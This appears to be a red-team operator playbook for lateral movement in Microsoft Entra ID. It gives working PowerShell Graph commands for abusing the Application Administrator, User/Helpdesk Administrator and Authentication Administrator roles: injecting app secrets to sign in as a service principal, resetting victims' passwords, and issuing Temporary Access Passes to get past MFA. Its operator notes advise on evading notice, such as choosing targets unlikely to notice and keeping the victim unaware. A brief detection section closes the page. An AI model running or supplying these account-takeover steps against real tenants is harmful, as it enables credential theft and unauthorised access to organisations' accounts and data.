## Overview

Three directory roles below Global Administrator each enable a distinct lateral movement path via Graph API. None of them require tenant-wide admin privileges, and all three are commonly granted to helpdesk, DevOps, and IT operations staff. Compromising an identity that holds any of these roles — or activating them via PIM — opens direct paths to credential access and account takeover.

## Role 1: Application Administrator

**What it allows:** Add or modify credentials (secrets, certificates) on any app registration within scope. Does not require access to the application's existing secret.

**Attack path:** Add a new client secret to a target app registration → authenticate as that Service Principal → access whatever the SP has permissions on (Graph, ARM, Key Vault, Storage).

```powershell
# Add a new client secret to a target application object
$cred = @{
    displayName = "<CREDENTIAL_NAME>"
    endDateTime = (Get-Date).AddMonths(6)
}
$secret = Add-MgApplicationPassword -ApplicationId "<APP_OBJECT_ID>" -PasswordCredential $cred

# $secret.SecretText contains the new client secret — use it immediately
# Authenticate as the Service Principal
$sp = New-Object System.Management.Automation.PSCredential(
    "<APP_CLIENT_ID>",
    (ConvertTo-SecureString $secret.SecretText -AsPlainText -Force)
)
Connect-MgGraph -ClientSecretCredential $sp -TenantId "<TENANT_ID>"
Connect-AzAccount -ServicePrincipal -Credential $sp -Tenant "<TENANT_ID>"
```

**Scope:** Tenant-wide by default; can be scoped to an Administrative Unit. Targets apps in the same tenant — cannot add secrets to apps in other tenants.

## Role 2: User Administrator / Helpdesk Administrator

**What it allows:** Reset passwords for non-privileged users. Cannot target Global Admins, Privileged Auth Admins, or users with other protected roles.

**Attack path:** Reset the password of a target non-admin user → authenticate as that user → access their resources, email, Teams, files, and any Azure RBAC they hold.

```powershell
# Reset target user's password
$passwordProfile = @{
    forceChangePasswordNextSignIn = $false
    password = "<NEW_PASSWORD>"
}
Update-MgUser -UserId "<user@tenant.com>" -PasswordProfile $passwordProfile

# Authenticate as the target user
$creds = New-Object System.Management.Automation.PSCredential(
    "<user@tenant.com>",
    (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force)
)
Connect-AzAccount -Credential $creds -Tenant "<TENANT_ID>"
```

**Scope:** Tenant-wide or AU-scoped. Helpdesk Administrator is a subset — fewer role types can be targeted.

## Role 3: Authentication Administrator

**What it allows:** Manage authentication methods for users in scope — including creating Temporary Access Passes (TAP). TAP is a time-limited passcode that satisfies MFA requirements, allowing authentication without a registered MFA method.

**Attack path:** Issue a TAP for a target user → authenticate as that user using the TAP → full session including MFA satisfaction.

```powershell
# Issue a Temporary Access Pass for a target user
$tapProps = @{
    isUsableOnce = $true
    startDateTime = (Get-Date)
}
$tap = New-MgUserAuthenticationTemporaryAccessPassMethod `
    -UserId "<user@tenant.com>" `
    -BodyParameter ($tapProps | ConvertTo-Json)

# $tap.TemporaryAccessPass contains the TAP code
# Use it to sign in as the target user — satisfies MFA on that login
Write-Host "TAP: $($tap.TemporaryAccessPass) | Valid: $($tap.LifetimeInMinutes) minutes"
```

**Scope:** Cannot target Global Admins or Privileged Authentication Admins. TAP validity is typically 30 minutes and single-use when `isUsableOnce: true`.

## Operator Notes

- **Application Admin** is the highest-leverage of the three — targeting Service Principals with broad permissions (Owner on subscriptions, Global Reader, custom roles) yields significant access without touching user accounts.
- **User Admin / Helpdesk Admin** is noisiest — password resets generate events and the user is immediately locked out. Use it for identities where disruption is acceptable or where the target is unlikely to notice quickly.
- **Authentication Admin TAP** is the most surgical — the user remains unaware their account was accessed, and no password change is visible. The TAP expires and leaves minimal trace if used once and promptly.
- All three operations appear in the Entra ID Audit Log. The event actor is the compromised identity that holds the role — not the target.
- PIM-eligible versions of these roles can be activated via API before using them — see **PIM — Eligible Role Activation** for the activation flow.

## Detection / Friction Points

- App credential additions: `Update application – Certificates and secrets` in Audit Log.
- Password resets: `Reset user password` in Audit Log — target user may receive a notification email.
- TAP issuance: `Create a Temporary Access Pass` method in Audit Log — TAP generation is logged with actor, target, validity window.
- Sign-in using TAP: authentication method shows `TemporaryAccessPass` in sign-in logs — distinguishable from normal auth methods if log analysis includes method field.
